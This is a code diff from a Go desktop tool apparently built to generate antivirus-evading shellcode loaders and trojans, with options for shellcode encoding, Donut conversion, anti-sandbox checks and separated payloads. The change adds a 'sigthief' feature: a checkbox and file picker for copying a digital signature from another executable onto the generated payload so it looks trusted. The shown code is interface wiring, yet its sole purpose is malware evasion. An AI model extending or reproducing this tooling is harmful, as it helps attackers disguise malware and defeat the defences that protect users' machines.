@@ -37,6 +37,7 @@ var (
 		ShellcodeEncode:   "",
 		Donut:             false,
 		Separate:          "",
+		SignFileLoc:       "",
 		ShellcodeLocation: "code.txt",
 		AntiSandboxOpt:    AntiSandboxOpt,
 		BuildOpt:          BuildOpt,
@@ -223,17 +224,43 @@ func BypassAV(win fyne.Window) fyne.CanvasObject {
 		}
 	})
 	separateradio.Horizontal = true
-	//separateCheck := widget.NewCheck("分离免杀", func(b bool) {
-	//	TempOpt.Separate = b
-	//	switch b {
-	//	case true:
-	//		separateLocation.Show()
-	//		separateUrl.Show()
-	//	case false:
-	//		separateLocation.Hide()
-	//		separateUrl.Show()
-	//	}
-	//})
+
+	//sigthief按钮
+	SignFileEntry := widget.NewEntry()
+	SignFilelbutton := widget.NewButton("File", func() {
+		fd := dialog.NewFileOpen(func(reader fyne.URIReadCloser, err error) {
+			if err != nil {
+				dialog.ShowError(err, win)
+				return
+			}
+			if reader == nil {
+				log.Println("Cancelled")
+				return
+			}
+			sigexe := reader.URI().Path()
+			println(sigexe)
+			SignFileEntry.SetText(sigexe)
+			TempOpt.SignFileLoc = sigexe
+		}, win)
+		pwd, _ := os.Getwd()
+		nowFileURI := storage.NewFileURI(pwd)
+		listerURI, _ := storage.ListerForURI(nowFileURI)
+		fd.SetLocation(listerURI)
+		fd.Resize(fyne.NewSize(600, 480))
+		//fd.SetFilter(storage.NewExtensionFileFilter([]string{".bin", ".txt", ".exe", ".dll"}))
+		fd.Show()
+	})
+	SignFileRow := container.NewBorder(nil, nil, SignFilelbutton, nil, SignFileEntry)
+	SignFileRow.Hide()
+	SignCheck := widget.NewCheck("启用数字签名", func(b bool) {
+		switch b {
+		case true:
+			SignFileRow.Show()
+		case false:
+			SignFileRow.Hide()
+		}
+	})
+
 	//增强功能UI设计
 	//advancedchecklabel := widget.NewLabel("增 强 功 能 ：")
 	//advancedcheck1 := widget.NewCheck("末尾添加垃圾数据过WD", func(b bool) {
@@ -265,10 +292,12 @@ func BypassAV(win fyne.Window) fyne.CanvasObject {
 	return container.NewVBox(
 		SelectFileV,
 		TrojanFileV,
+		BypassSelectV,
 		separateradio,
 		separateLocation,
 		separateUrl,
-		BypassSelectV,
+		SignCheck,
+		SignFileRow,
 		//BypassSelectV2,
 		sandboxLabel,
 		sandboxV,
